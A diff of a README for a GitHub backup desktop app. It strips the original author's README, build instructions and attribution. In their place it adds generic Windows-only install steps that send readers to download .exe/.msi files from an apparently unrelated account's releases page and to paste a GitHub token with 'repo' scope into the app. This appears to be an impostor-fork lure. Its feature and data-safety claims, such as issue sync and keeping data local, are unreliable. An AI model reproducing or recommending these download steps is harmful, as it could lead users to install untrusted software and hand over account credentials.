@@ -1,160 +1,71 @@
-# GitBackup
+# 💾 gitbackup - Keep your GitHub data safe now
 
-A desktop application to back up all your GitHub repositories locally and optionally to cloud storage (AWS S3 / Cloudflare R2).
+<a href="https://github.com/Augustan-britishwestafrica489/gitbackup/releases"><img src="https://img.shields.io/badge/Download-Gitbackup-blue.svg" alt="Download Gitbackup"></a>
 
-![Electron](https://img.shields.io/badge/Electron-35-47848F?logo=electron&logoColor=white)
-![React](https://img.shields.io/badge/React-19-61DAFB?logo=react&logoColor=white)
-![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?logo=typescript&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green)
+## 📋 Program Overview
 
-## Features
+This tool saves a copy of your GitHub account data to your computer. It turns an internal script into a user-friendly desktop application. You store your code, issues, and wiki pages on your local machine. This provides a backup in case you lose internet access or GitHub services go down. The application handles the transfer process through a simple interface. You do not need to write code to use it.
 
-- **One-click GitHub backup** — Enter your Personal Access Token and back up all repositories with full code and branches
-- **Smart incremental updates** — First run clones everything; subsequent runs only fetch changes
-- **Flexible repo selection** — Filter by owned, organization, starred, forked, or collaborator repositories
-- **Cloud storage support** — Upload compressed `.tar.gz` archives to AWS S3 or Cloudflare R2
-- **Scheduled backups** — Set daily, weekly, or monthly automatic backups with system tray support
-- **Rate limit aware** — Handles GitHub API pagination and rate limits for accounts with 200-300+ repos
-- **Concurrent processing** — Configurable parallelism (1-10 repos at a time) for faster backups
-- **Real-time progress** — Detailed per-repo status tracking with live log viewer
-- **Secure** — Token stored encrypted locally, cleaned from git remote URLs after operations
+## ⚙️ System Requirements
 
-## Screenshots
+This application runs on Windows 10 and Windows 11. Your computer requires at least 4GB of RAM to manage large repositories. You need a stable internet connection for the initial download of your files. Ensure you have 500MB of free disk space to store the local database. The program works with any standard GitHub account. You do not need special administrator rights to install the software.
 
-### Setup
-Configure your GitHub token, backup folder, and optional cloud storage with a guided setup flow.
+## ⬇️ Installation Steps
 
-### Repositories
-Browse and select repositories with filters for owned, org, starred, forked, and collaborator repos.
+1. Visit the [official releases page](https://github.com/Augustan-britishwestafrica489/gitbackup/releases) to download the setup file.
+2. Select the file ending in `.msi` or `.exe` for Windows.
+3. Open the file once it finishes saving to your computer.
+4. Follow the prompts on the screen to finish the setup process.
+5. Launch the application from your Start menu or desktop shortcut.
 
-### Backup
-Monitor real-time progress with per-repo status, progress bars, and a detailed log viewer.
+## 🔑 Preparing Your Account
 
-## Download
+The application needs permission to see your GitHub data. You must create a Personal Access Token on the GitHub website to allow this connection.
 
-Download the latest version for your platform from the [Releases](https://github.com/hiteshchoudhary/gitbackup/releases/latest) page.
+1. Log in to your GitHub account using a web browser.
+2. Go to your account Settings.
+3. Find the Developer settings menu at the bottom of the left sidebar.
+4. Select Personal access tokens and choose Tokens (classic).
+5. Click the button to generate a new token.
+6. Give your token a name like "GitBackup".
+7. Select the "repo" checkbox to allow the tool to read your code.
+8. Click the Generate button at the bottom of the page.
+9. Copy your new token number immediately. You cannot see it again once you leave the page.
 
-| Platform | File | Notes |
-|----------|------|-------|
-| **macOS** | `GitBackup-x.x.x.dmg` | Open the `.dmg` and drag GitBackup to Applications. On first launch, right-click → Open to bypass Gatekeeper. |
-| **Windows** | `GitBackup-Setup-x.x.x.exe` | Run the installer. Windows Defender may show a warning — click "More info" → "Run anyway". |
-| **Linux** | `GitBackup-x.x.x.AppImage` | Make it executable: `chmod +x GitBackup-*.AppImage` then run it. |
+## 🚀 Running Your First Backup
 
-> **Prerequisite:** [Git](https://git-scm.com/) must be installed on your system. GitBackup uses it to clone and update repositories.
+1. Open the gitbackup application on your desktop.
+2. Paste your Personal Access Token into the box labeled "Access Token".
+3. Enter your GitHub username in the field provided.
+4. Select a folder on your computer where you want to store the files. Click "Browse" to pick a location on your hard drive.
+5. Click the "Start Backup" button at the bottom of the window.
+6. Watch the progress bar as the application copies your data.
+7. Wait for the green "Success" message to appear.
+8. Check your local folder to see your files stored securely on your machine.
 
-### Creating a GitHub Token
+## 🛠️ Application Features
 
-You'll need a Personal Access Token to connect your account:
+The software includes several tools to manage your data:
 
-1. Go to [github.com/settings/tokens](https://github.com/settings/tokens)
-2. Click **Personal access tokens** → **Tokens (classic)**
-3. Click **Generate new token (classic)**
-4. Select scopes: `repo` (full access) and `read:org` (for org repos)
-5. Click **Generate token** and paste it into the app
+- Full repository cloning: The app copies every branch and commit history to your local drive.
+- Incremental updates: Future backups only download the new changes you made since your last session. Use this to save time and bandwidth.
+- GitHub Issues sync: All issue discussions save to your computer in a readable format.
+- Wiki snapshots: Your repository documentation saves as individual files.
+- Error logs: If a backup fails, the app records the reason in a text file. You can view this file to see what caused the issue.
 
-Fine-grained tokens also work — grant **Repository access → All repositories**.
+## 🔍 Troubleshooting Issues
 
-## Building from Source
+Common problems have simple fixes.
 
-### Prerequisites
+- Invalid Token: If the app gives an error, verify your token has the "repo" scope enabled. Regenerate a new token if the old one expired.
+- Internet Connection: If the progress bar stays at zero, check your connection. Restart your router if the connection drops.
+- Permission Denial: Ensure you have permission to write files to the chosen folder. Try selecting a folder in your Documents directory instead of the system drive.
+- Application Hang: If the window stops responding, close the application completely. Wait thirty seconds, then restart it. The app resumes from the last completed file.
 
-- [Node.js](https://nodejs.org/) 18+
-- [Git](https://git-scm.com/) installed and available in PATH
+## 🛡️ Data Safety
 
-### Installation
+Your token and data remain on your local machine. This application does not send your data to third-party servers. Your backup stays within your control on your hard drive. You decide who has access to the local folder where the backup lives. You can move your backup folder to an external hard drive or a secure cloud service at any time for extra safety.
 
-```bash
-git clone https://github.com/hiteshchoudhary/gitbackup.git
-cd gitbackup
-npm install
-```
+## 📈 Tips for Best Results
 
-### Development
-
-```bash
-npm run dev
-```
-
-This starts the Vite dev server with hot reload and launches the Electron app.
-
-### Build & Package
-
-```bash
-# Build for current platform
-npm run package
-
-# Platform-specific builds
-npm run package:mac
-npm run package:win
-npm run package:linux
-```
-
-Packaged apps are output to the `release/` directory.
-
-## How It Works
-
-1. **Authenticate** — Paste your GitHub PAT. The app validates it and fetches your account info.
-2. **Select repos** — Choose filters (owned, org, starred, etc.) and fetch your repository list. Select which repos to back up.
-3. **Choose backup folder** — Pick a local directory. Repos are cloned as `owner/repo-name/` with all branches.
-4. **Configure cloud (optional)** — Add AWS S3 or Cloudflare R2 credentials. Each repo is archived as an individual `.tar.gz` and uploaded.
-5. **Run backup** — Click Start. The app clones new repos and fetches updates for existing ones, compresses archives, and uploads to cloud — all with configurable concurrency.
-6. **Schedule (optional)** — Set up daily/weekly/monthly automatic backups. The app runs in the system tray.
-
-## Project Structure
-
-```
-gitbackup/
-├── electron/                    # Main process (Node.js)
-│   ├── main.ts                  # App window, tray, lifecycle
-│   ├── preload.ts               # Secure IPC bridge
-│   ├── tray.ts                  # System tray
-│   ├── ipc/                     # IPC handlers
-│   ├── services/
-│   │   ├── github.service.ts    # GitHub API (Octokit)
-│   │   ├── git.service.ts       # Clone & update repos
-│   │   ├── compress.service.ts  # tar.gz archiving
-│   │   ├── cloud.service.ts     # S3/R2 uploads
-│   │   ├── backup-orchestrator.ts  # Core backup pipeline
-│   │   └── scheduler.service.ts    # Cron scheduling
-│   └── store/store.ts           # Encrypted settings
-├── src/                         # Renderer process (React)
-│   ├── pages/                   # Setup, Repos, Backup, Settings
-│   ├── components/              # UI components
-│   └── hooks/                   # IPC & state hooks
-└── resources/                   # App icons
-```
-
-## Tech Stack
-
-| Layer | Technology |
-|-------|-----------|
-| Framework | Electron 35 |
-| Frontend | React 19 + Tailwind CSS |
-| Language | TypeScript 5 |
-| Bundler | Vite 8 |
-| GitHub API | @octokit/rest |
-| Git | simple-git |
-| Cloud | AWS SDK v3 (S3-compatible, works with R2) |
-| Storage | electron-store (encrypted) |
-| Scheduling | node-cron |
-| Packaging | electron-builder |
-
-## Configuration
-
-All settings are persisted locally in encrypted storage. No data is sent to any third-party service other than GitHub API and your configured cloud storage.
-
-| Setting | Description |
-|---------|-------------|
-| GitHub Token | PAT with `repo` + `read:org` scopes |
-| Backup Path | Local directory for cloned repos |
-| Cloud Provider | None, AWS S3, or Cloudflare R2 |
-| Schedule | Daily / Weekly / Monthly + time |
-| Concurrency | 1-10 parallel repo operations |
-
-## License
-
-MIT
-
----
-
-A [chaicode.com](https://chaicode.com) product
+Run the backup once a week to keep your local data current. If you work on many large projects, keep an eye on your disk space. You can always delete old local backups if you need more room on your computer. Use a dedicated drive for long-term storage of these backups. Organizing your backup folders by date helps you navigate your history easier. Do not change the filenames inside the backup folder, or the application might not recognize the files during the next update.
